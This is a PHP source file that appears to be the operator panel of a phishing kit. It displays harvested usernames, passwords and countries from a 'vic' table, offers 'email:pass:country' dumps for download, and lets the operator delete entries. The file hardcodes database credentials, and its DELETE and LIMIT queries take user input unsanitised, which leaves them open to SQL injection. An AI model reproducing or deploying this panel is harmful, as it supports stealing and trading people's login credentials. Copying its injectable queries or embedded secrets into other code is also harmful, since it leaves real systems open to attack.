<?php
session_start();
include 'config.php';
if($_SESSION['username']){
		}else{
    header('Location:login_admin.php');
}
$session = $_SESSION['uid'];
?>
<?php 

    require_once('connection.php');

    if(isset($_GET['page']))
    {
        $page = $_GET['page'];
    }
    else
    {
        $page = 1;
    }

    $num_per_page = 10;
    $start_from = ($page-1)*02;
    
    $query = "select * from vic limit $start_from,$num_per_page";
    $result = mysqli_query($con,$query);

?>
<?php
$db = mysqli_connect('localhost', 'mvcontro_test', 'b20uIskjTOt9', 'mvcontro_test');
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $uid = $session;
    $id = $_POST['id'];
	$query = "DELETE FROM `vic` WHERE `vic`.`id` = '$id'";
  	mysqli_query($db, $query);
  	 header('Location:index_admin.php');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="bootstrap.css">
    <title>Index Admin</title>
</head>
<body>
    </Br>
    <div>
        <form action="download.php" method="post">
              <button class='btn btn-primary' type="submit">Download</button>
        </form>
        <br>
             <form action="download1.php" method="post">
              <button class='btn btn-primary' type="submit">Download email:pass:country</button>
        </form>
        <Br>

        <a class='btn btn-primary' href="rest_password.php">Change Password Admin</a>
        <Br>
       
    </div>
    <Br>
        <hr>
        
        <div>
            <table class="table table-striped">
            <tr>
                <td> Username </td>
                <td> Password </td>
                <td> Country </td>
                <td>  </td>
            </tr>
            <tr>
                <?php 
                    while($row=mysqli_fetch_assoc($result))
                    {
                ?>
                    <td> <?php echo $row['username'] ?> </td>
                    <td> <?php echo $row['password'] ?> </td>
                    <td> <?php echo $row['country'] ?> </td>
                    <form method="post" action="">
                            <input value="<?php echo $row['id']; ?>" name="id" hidden />
                                            <td> <button class='btn btn-danger' type="submit">Delete</button> </td>

                    </form>
                   
            </tr>
         <?php 
                }
                ?>
        </table>

        <?php 
        
                $pr_query = "select * from vic ";
                $pr_result = mysqli_query($con,$pr_query);
                $total_record = mysqli_num_rows($pr_result );
                
                $total_page = ceil($total_record/$num_per_page);

                if($page>1)
                {
                    echo "<a href='index_admin.php?page=".($page-1)."' class='btn btn-danger'>Previous</a>";
                }

                
                for($i=1;$i<$total_page;$i++)
                {
                    echo "<a href='index_admin.php?page=".$i."' class='btn btn-primary'>$i</a>";
                }

                if($i>$page)
                {
                    echo "<a href='index_admin.php?page=".($page+1)."' class='btn btn-danger'>Next</a>";
                }
        
        ?>
        </div>

        
</body>
</html>